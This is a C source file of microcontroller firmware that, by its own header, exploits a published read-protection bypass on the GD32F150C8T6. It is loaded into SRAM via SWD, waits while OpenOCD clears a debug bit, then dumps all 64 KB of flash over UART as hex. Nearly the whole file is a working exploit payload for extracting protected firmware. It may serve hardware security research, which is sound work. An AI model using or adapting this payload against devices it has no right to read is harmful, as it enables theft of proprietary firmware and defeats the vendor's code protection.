/*
 * Flash memory dump for GD32F150C8T6 via UART
 *
 * Exploits GigaVulnerability #2 (PT SWARM):
 *   1. This code is loaded into SRAM and started via SWD
 *   2. It initializes UART and waits (delay loop)
 *   3. During the wait, OpenOCD clears CDBGPWRUPREQ bit
 *   4. After the delay, the code reads flash and sends it over UART
 *
 * Output format (hex, easy to capture and verify):
 *   READY
 *   DUMP:08000000:00010000
 *   :08000000 AA BB CC DD EE FF 00 11 22 33 44 55 66 77 88 99 [checksum]
 *   :08000010 ...
 *   END:[total_checksum]
 *
 * Does NOT write to flash. Does NOT modify Option Bytes.
 */

#include <stdint.h>

/* ── RCU ── */
#define RCU_BASE      0x40021000
#define RCU_AHBEN     (*(volatile uint32_t *)(RCU_BASE + 0x14))
#define RCU_APB1EN    (*(volatile uint32_t *)(RCU_BASE + 0x1C))

/* ── GPIOA ── */
#define GPIOA_BASE    0x48000000
#define GPIOA_CTL     (*(volatile uint32_t *)(GPIOA_BASE + 0x00))
#define GPIOA_OSPD    (*(volatile uint32_t *)(GPIOA_BASE + 0x08))
#define GPIOA_AFSEL0  (*(volatile uint32_t *)(GPIOA_BASE + 0x20))

/* ── USART1 ── */
#define USART1_BASE   0x40004400
#define USART1_CTL0   (*(volatile uint32_t *)(USART1_BASE + 0x00))
#define USART1_BAUD   (*(volatile uint32_t *)(USART1_BASE + 0x0C))
#define USART1_STAT   (*(volatile uint32_t *)(USART1_BASE + 0x1C))
#define USART1_TDATA  (*(volatile uint32_t *)(USART1_BASE + 0x28))

#define UEN   (1 << 0)
#define TEN   (1 << 3)
#define TBE   (1 << 7)

/* ── SCB (System Control Block) ── */
#define SCB_VTOR      (*(volatile uint32_t *)0xE000ED08)

/* ── Flash parameters ── */
#define FLASH_START   0x08000000
#define FLASH_SIZE    0x10000     /* 64 KB for GD32F150C8T6 */
#define LINE_BYTES    16          /* bytes per output line   */

/* ──────────────────────────────────────────────────────── */

static void delay(volatile uint32_t n)
{
    while (n--) __asm__ volatile("");
}

static void uart_putc(uint8_t c)
{
    while (!(USART1_STAT & TBE))
        ;
    USART1_TDATA = c;
}

static void uart_puts(const char *s)
{
    while (*s)
        uart_putc((uint8_t)*s++);
}

static const char hex_lut[] = "0123456789ABCDEF";

static void uart_put_hex8(uint8_t b)
{
    uart_putc(hex_lut[b >> 4]);
    uart_putc(hex_lut[b & 0x0F]);
}

static void uart_put_hex32(uint32_t v)
{
    uart_put_hex8((v >> 24) & 0xFF);
    uart_put_hex8((v >> 16) & 0xFF);
    uart_put_hex8((v >>  8) & 0xFF);
    uart_put_hex8( v        & 0xFF);
}

static void uart_init(void)
{
    /* Enable clocks */
    RCU_AHBEN  |= (1 << 17);   /* GPIOA  */
    RCU_APB1EN |= (1 << 17);   /* USART1 */
    delay(100);

    /* PA2 → AF1 (USART1_TX), medium speed */
    {
        uint32_t ctl = GPIOA_CTL;
        ctl &= ~(3U << (2 * 2));
        ctl |=  (2U << (2 * 2));
        GPIOA_CTL = ctl;

        uint32_t spd = GPIOA_OSPD;
        spd &= ~(3U << (2 * 2));
        spd |=  (1U << (2 * 2));
        GPIOA_OSPD = spd;

        uint32_t af = GPIOA_AFSEL0;
        af &= ~(0xFU << (2 * 4));
        af |=  (0x1U << (2 * 4));
        GPIOA_AFSEL0 = af;
    }

    /* 115200 baud @ 8 MHz HSI */
    USART1_CTL0 = 0;
    USART1_BAUD = 0x45;
    USART1_CTL0 = UEN | TEN;
}

/* ──────────────────────────────────────────────────────── */

void main(void)
{
    uart_init();

    /* Signal: UART is ready */
    uart_puts("READY\r\n");

    /*
     * Wait ~3 seconds for OpenOCD to clear CDBGPWRUPREQ.
     * At 8 MHz, ~8 cycles per loop iteration → 3M iterations ≈ 3 sec.
     */
    delay(3000000);

    /* Announce dump parameters */
    uart_puts("DUMP:");
    uart_put_hex32(FLASH_START);
    uart_putc(':');
    uart_put_hex32(FLASH_SIZE);
    uart_puts("\r\n");

    /* Read flash and transmit as hex */
    const uint8_t *flash = (const uint8_t *)FLASH_START;
    uint32_t checksum = 0;

    for (uint32_t offset = 0; offset < FLASH_SIZE; offset += LINE_BYTES) {
        /* Line header: address */
        uart_putc(':');
        uart_put_hex32(FLASH_START + offset);
        uart_putc(' ');

        /* Data bytes */
        uint8_t line_sum = 0;
        for (uint32_t j = 0; j < LINE_BYTES; j++) {
            uint8_t b = flash[offset + j];
            uart_put_hex8(b);
            uart_putc(' ');
            line_sum += b;
            checksum += b;
        }

        /* Line checksum */
        uart_put_hex8(line_sum);
        uart_puts("\r\n");
    }

    /* Final checksum */
    uart_puts("END:");
    uart_put_hex32(checksum);
    uart_puts("\r\n");

    /* Done — blink or halt */
    uart_puts("DONE\r\n");
    while (1)
        delay(1000000);
}
